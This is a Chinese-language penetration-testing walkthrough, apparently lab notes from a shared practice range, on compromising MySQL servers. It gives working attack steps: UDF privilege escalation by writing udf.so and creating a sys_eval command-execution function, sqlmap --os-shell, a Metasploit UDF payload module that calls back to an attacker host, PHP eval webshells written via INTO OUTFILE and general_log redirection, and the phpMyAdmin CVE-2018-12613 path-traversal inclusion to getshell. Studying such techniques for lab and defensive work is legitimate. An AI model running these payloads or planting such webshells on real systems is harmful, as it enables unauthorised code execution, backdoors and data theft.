# 参考[MySQL渗透 (CVE-2012-2122)](https://p7ivesc.github.io/post/MySQL-shen-tou-CVE-2012-2122.html)文档，进行mysql渗透

UDF：User Defined Function，用户自定义函数 

UDF的设计初衷是为了实现功能的多样化和方便用户自定义一些操作函数，但在提升便捷 

性的同时，也带来了命令执行利用的可能。在MySQL中，可以通过创建指向特定库文件 

（Windows中的dll，Linux中的so）的自定义函数，从而实现特定的功能。攻击者利用此特 

点，就可以创建一个能够命令执行的函数。 

利用条件 

• 能够连接到MySQL数据库并执行SQL语句 

• 能够向主机上写入文件 secure\_file\_priv

```SQL
show global variables like "secure_file_priv";
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c48e39d48159.png)

kali中自带的UDF提权库文件

```Bash
cd /usr/share/metasploit-framework/data/exploits/mysql
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/239e66d35f45.webp)

确认MySQL库文件路径 

```SQL
show variables like '%plugin%';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0a85afe724ba.png)

# 在MySQL中写入恶意库文件 

```SQL
SELECT unhex("") into dumpfile '/usr/local/mysql/lib/plugin/udf.so';
```

创建恶意函数，指向特定库文件 

```SQL
create function sys_eval returns string SONAME 'udf.so'; 
```

命令执行 

```SQL
select sys_eval('id');
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a050ad5adb88.png)

检查创建的函数 

```SQL
select * from mysql.func where name = 'sys_eval';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9bc02dd10200.png)

删除函数 

```SQL
drop function sys_eval; 
```

```SQL
select * from mysql.func where name = 'sys_eval';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e13d49da76a0.png)

# 使用sqlmap来进行udf提权 

```Bash
sqlmap -d "mysql://root:123456@10.3.4.95:3306/mysql" --os-shell
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/68d932478737.webp)

# 使用msf来进行udf提权，但是无回显，需要写入后自行登录执行命令

```Bash
use exploit/multi/mysql/mysql_udf_payload 
msf exploit(multi/mysql/mysql_udf_payload) > set rhosts 10.3.4.95
rhosts => 10.3.4.95
msf exploit(multi/mysql/mysql_udf_payload) > set password 123456
password => 123456
msf exploit(multi/mysql/mysql_udf_payload) > set lhost 192.168.205.48
lhost => 192.168.205.48
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/51c159674d2e.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88deb699aeec.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/da62d2918399.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a59a6f2d3203.webp)

# PHPMyadmin登录后台后，可以直接执行SQL语句，因此可以尝试直接往web目录下写入webshell

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fdb15c72759e.webp)

```Bash
-- 查看是否有写入权限 
show global variables like '%secure%'; 
-- 写入webshell
select '<?php @eval($_POST[shell]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/efbf4cba5d90.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a68c9e53c54e.png)

由于是公用靶场，所以已经有shell了，可以直接使用

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2300d9c36942.png)

## 若无法通过SELECT语句写入文件，则可以尝试使用日志文件来写入webshell 

```SQL
-- 查看general日志文件配置情况 
show global variables like "%general%"; 
-- 通过设置general_log选项设置日志写入路径 
set global general_log='on'; 
SET global general_log_file='/var/www/html/cmd.php'; 
-- 在查询中执行语句，写入webshell 
SELECT '<?php eval($_POST["cmd"]);?>';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1cc34f46bef.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ffefa2caaf84.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6da20a3c9424.webp)

## phpmyadmin4\.8\.1远程文件包含漏洞（CVE\-2018\-12613） 

phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index\.php中存在一 

处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。 

利用前提： 

能进进入管理页面，通过弱口令等方式

### 1\.访问 http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./etc/passwd 页面，验证是否存在漏洞

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/46dc1ab6f4ad.webp)

### 2\.执行 sql 语句写入php代码SELECT "\<?php phpinfo\(\);?\>";

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/48e0c079ae78.png)

### 3\.查看自己的 seesionid

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e134e9059131.webp)

### 4\.访问http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./tmp/sess\_sessid即包含session文件，即可 getshell

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c16260d820b5.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/20dbf4c1cd3c.webp)
